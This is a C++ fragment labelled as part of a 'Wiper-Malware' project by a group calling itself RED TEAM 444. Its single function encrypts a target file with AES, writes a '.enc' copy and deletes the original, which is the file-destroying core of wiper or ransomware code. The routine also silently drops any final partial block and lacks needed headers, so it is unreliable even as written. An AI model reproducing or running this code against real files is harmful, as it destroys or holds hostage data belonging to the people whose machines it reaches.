/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <openssl/aes.h>  // You'll need the OpenSSL library for AES encryption

void encryptFile(const std::string& filepath, const unsigned char* key) {
    std::ifstream infile(filepath, std::ios::binary);
    std::ofstream outfile(filepath + ".enc", std::ios::binary);

    if (!infile.is_open() || !outfile.is_open()) {
        std::cerr << "Error opening file for encryption: " << filepath << "\n";
        return;
    }

    AES_KEY aesKey;
    AES_set_encrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (infile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_encrypt(inBuffer, outBuffer, &aesKey);
        outfile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    infile.close();
    outfile.close();
    std::filesystem::remove(filepath);  // Delete the original file
    std::cout << "File " << filepath << " encrypted and deleted.\n";
}
